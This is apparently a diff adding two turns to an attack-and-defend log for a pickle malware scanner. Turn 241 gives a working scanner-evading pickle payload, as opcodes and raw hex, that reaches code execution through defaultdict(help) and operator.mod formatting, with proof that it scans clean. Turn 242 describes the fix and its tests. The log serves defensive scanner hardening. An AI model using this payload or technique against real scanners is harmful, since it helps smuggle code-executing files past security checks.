@@ -14740,3 +14740,188 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3743 passed, 1022 skipped, 21 warnings in 51.20s`.
+
+## Turn 241 - Bypass via old-style `%` mapping lookup with `operator.mod`
+
+Found another scanner-clean RCE-capable mapping-dispatch bypass, this time in
+old-style string formatting. The recent defenses model `str.format_map` and
+`string.Formatter` lookup paths, but Python's percent-formatting path also
+performs mapping lookups for named placeholders. The payload constructs
+`collections.defaultdict(builtins.help)`, then invokes
+`operator.mod("%(x)s", mapping)`. The missing named placeholder performs
+`mapping["x"]`; that calls the `defaultdict` factory with no arguments.
+`builtins.help()` then enters `_sitebuiltins._Helper.__call__`, which imports
+`pydoc`. A shadow `pydoc.py` at the front of `sys.path` executes during
+`pickle.loads`.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL collections defaultdict
+STACK_GLOBAL builtins help
+TUPLE1
+REDUCE              # construct defaultdict(help)
+MEMOIZE
+POP
+STACK_GLOBAL operator mod
+MARK
+SHORT_BINUNICODE "%(x)s"
+BINGET 0
+TUPLE
+REDUCE              # "%(x)s" % defaultdict(help)
+STOP
+```
+
+Raw payload:
+
+```text
+80048c0b636f6c6c656374696f6e738c0b64656661756c7464696374938c086275696c74696e738c0468656c7093855294308c086f70657261746f728c036d6f6493288c052528782973680074522e
+```
+
+Scanner proof:
+
+```text
+payload_len 79
+scan clean complete findings 0 errors ()
+import_refs (
+  {'module': 'collections', 'name': 'defaultdict',
+   'import_reference': 'collections.defaultdict', 'is_dangerous': False},
+  {'module': 'builtins', 'name': 'help',
+   'import_reference': 'builtins.help', 'is_dangerous': False},
+  {'module': 'operator', 'name': 'mod',
+   'import_reference': 'operator.mod', 'is_dangerous': False},
+)
+callable_invocations (
+  {'module': 'collections', 'name': 'defaultdict',
+   'opcode_position': 47, 'positional_arg_count': 1},
+  {'module': 'operator', 'name': 'mod',
+   'opcode_position': 77, 'positional_arg_count': 2},
+)
+call_graph None
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime stdout
+result 'factory-value'
+marker_exists True
+marker_text pydoc-owned
+
+runtime stderr
+```
+
+The child proof inserted a temporary module directory at the front of
+`sys.path`, removed `pydoc` from `sys.modules`, and ran `pickle.loads(payload)`.
+The shadow `pydoc.py` wrote the marker at import time and provided a minimal
+`help` function returning `"factory-value"`.
+
+Why it bypasses:
+
+- Native policy does not mark `collections.defaultdict`, `builtins.help`, or
+  public `operator.mod` as dangerous.
+- Earlier `operator.mod` game turns covered attacker-defined `__mod__` and
+  `__rmod__` slots; this path uses built-in string percent formatting and no
+  magic-method literal.
+- The native stack model already remembers `defaultdict(default_factory)`, but
+  does not model the old-style string-formatting lookup performed by
+  `operator.mod(format_string, mapping)`.
+- The Python call graph already aliases an invoked `builtins.help()` to
+  `_sitebuiltins._Helper.__call__ -> builtins.__import__`, but native metadata
+  never emits that hidden zero-argument factory invocation.
+- The payload contains no `pydoc`, `import`, `__import__`, `eval`, `exec`,
+  `os.system`, or `subprocess` strings.
+
+Likely source-level defense:
+
+- Extend native mapping-dispatch modeling to cover
+  `operator.mod(format_string, mapping)` when the left operand is string-like.
+- For the current tracked source, if the right operand is
+  `StackValue::DefaultDict { default_factory }`, emit a zero-argument
+  invocation of the factory.
+- Keep this finite and stack-local, alongside the `str.format_map` and
+  `Formatter` mapping-dispatch helpers.
+- Consider importable siblings such as `builtins.str.__mod__` separately; the
+  representative proof uses public `operator.mod` because it is currently clean
+  and directly reaches the same percent-formatting path.
+
+Performance note:
+
+- Payload size is 79 bytes.
+- Warm scan median over 100 runs was `0.000056s` with max `0.000064s`.
+- A fix only needs to inspect already-extracted reducer arguments for the
+  single callable `operator.mod`.
+
+## Turn 242 - Defense for old-style `%` mapping lookup with `operator.mod`
+
+Blocked the Turn 241 bypass at the call-graph source instead of adding another
+package-specific dangerous global. The native stack model already tracks
+`collections.defaultdict(default_factory)`. This turn teaches protocol dispatch
+that `operator.mod(format_string, mapping)` performs an implicit mapping lookup
+when the left operand is string-like, so a tracked `defaultdict` right operand
+emits a hidden zero-argument invocation of its factory.
+
+Implementation:
+
+- Added `("operator", "mod")` to native protocol-dispatch modeling.
+- Added `defaultdict_mapping_lookup_invocations(...)` and reused it from:
+  `str.format_map`, `operator.mod`, and `string.Formatter` keyword-mapping
+  helpers.
+- Kept `operator.mod` itself clean. The detection fires on the finite hidden
+  call edge: percent-format mapping lookup -> `defaultdict.default_factory()`.
+
+Regression coverage:
+
+- Added
+  `test_scan_bytes_blocks_operator_mod_defaultdict_factory_rce`.
+- The test verifies `defaultdict(help)` construction remains clean.
+- The malicious case verifies
+  `operator.mod("%(x)s", defaultdict(help))` is malicious, records the hidden
+  zero-argument `builtins.help` invocation, and executes in a child interpreter
+  with a shadow `pydoc.py` marker proof.
+
+Post-fix proof:
+
+```text
+payload_len 79
+scan malicious scan_complete None findings 1 errors ()
+dangerous [('_sitebuiltins', '_Helper.__call__', 'builtins.__import__')]
+imports [('collections', 'defaultdict', None), ('builtins', 'help', None), ('operator', 'mod', None)]
+invocations [('collections', 'defaultdict', 1, 47), ('operator', 'mod', 2, 77), ('builtins', 'help', 0, 77)]
+runtime_result 'factory-value'
+marker_exists True
+marker_text pydoc-owned
+timing_median 0.000122
+timing_max 0.000241
+```
+
+Performance note:
+
+- The new path is stack-local and only runs for `operator.mod` reducer
+  invocations.
+- The shared helper removes duplicated `defaultdict` mapping-lookup code from
+  the existing format-map and formatter defenses.
+- Warm scan median for the fixed 79-byte payload was `0.000122s` over 1000
+  runs.
+
+Validation:
+
+- Rust formatting:
+  `cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Rebuilt local ignored extension with release `cargo build` plus macOS
+  dynamic-lookup linker flags, then copied it to
+  `packages/modelaudit-picklescan/src/modelaudit_picklescan/_rust.abi3.so` for
+  Python tests.
+- Focused `operator.mod` regression: `1 passed in 0.34s`.
+- Focused import/call-graph regression file: `29 passed in 1.15s`.
+- Focused call-graph suite: `67 passed in 3.04s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in
+  1.45s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3744 passed, 1022 skipped, 21 warnings in 52.52s`.
